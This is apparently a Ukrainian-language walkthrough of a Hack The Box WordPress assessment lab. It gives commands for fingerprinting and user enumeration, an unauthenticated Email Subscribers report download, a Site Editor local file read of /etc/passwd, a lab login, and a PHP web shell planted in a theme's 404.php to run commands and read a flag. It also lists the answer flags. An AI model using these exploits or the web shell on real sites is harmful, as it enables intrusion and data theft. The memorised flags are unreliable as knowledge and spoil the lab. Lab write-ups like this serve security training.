Загальні умови
Ціль: blog.inlanefreight.local.
​

CMS: WordPress 5.1.6.
​

У всіх командах нижче змінну TARGET можна експортувати так:

bash
export TARGET="http://blog.inlanefreight.local"
Question 1 — Визначити CMS / версію
Мета: дізнатися, що це WordPress і яка версія.

Команди
bash
whatweb $TARGET
Навіщо: швидке fingerprinting веб-додатку.

Результат: покаже WordPress 5.1.6, інші технології.
​
​

bash
curl -s "$TARGET" | grep -i "generator"
Навіщо: витягнути meta‑тег generator.

Результат: рядок на кшталт meta name="generator" content="WordPress 5.1.6".
​

Відповідь Q1: WordPress 5.1.6.
​

Question 2 — Перелік користувачів (WP)
Мета: знайти авторів / логіни WordPress.

Команди
bash
wpscan --url $TARGET -e u
Навіщо: перелік користувачів WordPress.

Результат: знайдені логіни типу admin, erika, charlie тощо.
​
​

Альтернатива через авторські сторінки:

bash
curl -s "$TARGET/?author=1" -L | grep -i "author" | head
curl -s "$TARGET/?author=2" -L | grep -i "author" | head
Навіщо: іноді редіректить на /author/<username>/ і палить логін.
​
​

Типова відповідь Q2: список користувачів, які ти отримав (наприклад admin, erika, charlie).
​
​

Question 3 — Флаг у контенті сайту
Мета: знайти перший флаг, схований у статтях/сторінках.

Команди
Просто глянути головну і пости:

bash
curl -s "$TARGET" | less
curl -s "$TARGET/?p=9" | less
Навіщо: переглянути HTML, текст постів, знайти HTB{...} у контенті.

Результат: у політиці Work from Home/іншому пості є фрагмент з флагом (у твоєму paste він був у HTML, ти його вже бачив).
​

Можна також grep‑нути:

bash
curl -s "$TARGET" | grep -o "HTB{[^}]*}"
Навіщо: автоматично витягнути флаг, якщо він прямо в HTML.

Результат: HTB{...} (перший флаг, який просять у Q3).
​

Відповідь Q3: той HTB‑флаг, який ти вже здавав з контенту (не плутати з Q5/Q8).

Question 4 — Особа Charlie
Мета: знайти повне ім’я Charlie.

Команди
Зазвичай ім’я є в самому сайті (автор/контакти):

bash
curl -s "$TARGET" | grep -i "Charlie" -n
curl -s "$TARGET" | grep -i "Wiggins" -n
Навіщо: знайти, де згадуються імена у контенті.

Результат: десь у тексті буде повне ім’я Charlie Wiggins.
​

Відповідь Q4: Charlie Wiggins.
​

Question 5 — Unauthenticated file download (Email Subscribers)
Мета: використати вразливий плагін для завантаження файлу з флагом без логіну.

Плагін: Email Subscribers & Newsletters 4.2.2 (CVE‑2019‑19985).

Команди
bash
curl "$TARGET/wp-admin/admin.php?page=download_report&report=users&status=all"
Навіщо: експлойт до Email Subscribers — дає завантажити звіт з email‑підписниками без автентифікації.
​

Результат (CSV):

text
"First Name", "Last Name", "Email", "List", ...
"admin@inlanefreight.local", "HTB{unauTh_d0wn10ad!}", ...
"admin@inlanefreight.local", "HTB{unauTh_d0wn10ad!}", ...
Флаг у полі Last Name — це шукане значення для Q5.

Відповідь Q5: HTB{unauTh_d0wn10ad!}.
​

Question 6 — LFI через Site Editor
Мета: знайти вразливий плагін і версію, яка дає LFI.

Плагін: Site Editor 1.1.1.
​
​

Команди
Спочатку підтвердити наявність плагіна/версії (через вихід сторінки або WPScan):

bash
curl -s "$TARGET" | grep -i "site-editor" | head
Навіщо: побачити шляхи типу /wp-content/plugins/site-editor/... і файли .css з параметром ver=1.1.1.
​

Результат: рядок на кшталт
...wp-content/plugins/site-editor/framework/assets/css/general.min.css?ver=1.1.1.
​

Або:

bash
wpscan --url $TARGET -e ap,at,tt
Навіщо: знайти плагіни і їх версії, включно з Site Editor 1.1.1.
​

LFI (саме читання файлів) у цій лабі робиться через уразливу функціональність Site Editor (деталі в модулі, але суть: передати шлях до файла в параметр і витягнути, наприклад /etc/passwd).
​
​

Приклад (схематично, формат залежить від уроку):

bash
curl -s "$TARGET/?sed_file=/etc/passwd"
Навіщо: перевірити, чи можливо завантажити /etc/passwd через механіку Site Editor.

Результат: вивід /etc/passwd, де видно користувача frank.mclane (це потім Q7).
​

Відповідь Q6: 1.1.1 (версія Site Editor).
​

Question 7 — Користувач з /etc/passwd (через LFI)
Мета: використати LFI, щоб знайти специфічного користувача.

Команди
(Фактичний параметр залежить від уроку; припустимо, що він уже відомий з теорії — ти ним користувався.)

bash
curl -s "$TARGET/?sed_file=/etc/passwd"
Навіщо: прочитати /etc/passwd через LFI плагіну Site Editor.
​

Результат: вивід /etc/passwd, серед якого є рядок з frank.mclane.
​

Потім можна grep‑нути:

bash
curl -s "$TARGET/?sed_file=/etc/passwd" | grep -i "frank"
Навіщо: швидко виділити потрібного користувача.

Результат: рядок із frank.mclane:....

Відповідь Q7: frank.mclane.
​

Question 8 — RCE через 404.php та флаг у /home/erika
Мета: отримати RCE через редагування шаблону 404 у неактивній темі, потім прочитати флаг у домашній директорії erika.
​

1) Логін у WordPress
bash
# Вручну в браузері:
# URL: http://blog.inlanefreight.local/wp-login.php
# user: erika
# pass: 010203
Навіщо: отримати доступ до адмінки/редактора тем від користувача erika.
​

2) Перемкнутися на неактивну тему
У браузері:

Appearance → Themes

Активувати одну тему (наприклад Twenty Twenty‑One), а редагувати 404.php в іншій — Twenty Nineteen.

Навіщо: обійти loopback‑перевірку WordPress, яка ламає правки в активній темі.

3) Додати простий web‑shell у 404.php
У Appearance → Theme Editor → (неактивна тема) → 404.php вставити після шапки:

php
if ( isset( $_GET['cmd'] ) ) {
    system( $_GET['cmd'] );
    exit;
}
Навіщо: зробити простий RCE через GET‑параметр cmd.
​

Фрагмент початку файла виглядає так:

php
<?php
/**
 * The template for displaying 404 pages (not found)
 *
 * @link https://codex.wordpress.org/Creating_an_Error_404_Page
 *
 * @package WordPress
 * @subpackage Twenty_Nineteen
 * @since 1.0.0
 */

if ( isset( $_GET['cmd'] ) ) {
    system( $_GET['cmd'] );
    exit;
}

get_header();
?>
4) Викликати shell і знайти флаг
bash
curl -s "$TARGET/wp-content/themes/twentynineteen/404.php?cmd=id"
Навіщо: перевірити, що команда виконується.

Результат: uid=33(www-data) gid=33(www-data) groups=33(www-data).
​

bash
curl -s "$TARGET/wp-content/themes/twentynineteen/404.php?cmd=ls+/home"
Навіщо: побачити, які користувачі мають домашні директорії.

Результат: erika, frank.mclane, mrb3n.
​

bash
curl -s "$TARGET/wp-content/themes/twentynineteen/404.php?cmd=ls+-la+/home/erika"
Навіщо: перелік файлів у /home/erika.

Результат: файл d0ecaeee3a61e7dd23e0e5e4a67d603c_flag.txt.
​

bash
curl -s "$TARGET/wp-content/themes/twentynineteen/404.php?cmd=cat+/home/erika/d0ecaeee3a61e7dd23e0e5e4a67d603c_flag.txt"
Навіщо: зчитати вміст файла з флагом.

Результат: HTB{w0rdPr355_4SS3ssm3n7}.
​

Відповідь Q8: HTB{w0rdPr355_4SS3ssm3n7}.
​

Зведена табличка по питаннях 1–8
Q	Суть питання	Ключова дія / вразливість	Відповідь
1	CMS і версія	Fingerprinting (whatweb, meta generator)	WordPress 5.1.6
2	Перелік WP‑користувачів	WPScan user enum	admin, erika, charlie, ...
3	Перший флаг у контенті	Огляд постів / grep HTB{ }	HTB{...} із посту
4	Хто такий Charlie	Пошук у контенті	Charlie Wiggins
5	Unauth file download (Email Subscribers)	download_report exploit	HTB{unauTh_d0wn10ad!}
6	Версія вразливого Site Editor (LFI)	Аналіз плагінів / версій	1.1.1
7	Користувач з /etc/passwd через LFI	LFI → читання /etc/passwd	frank.mclane
8	RCE через 404.php і флаг у /home/erika	Theme Editor RCE, /home/erika/*_flag.txt	HTB{w0rdPr355_4SS3ssm3n7}
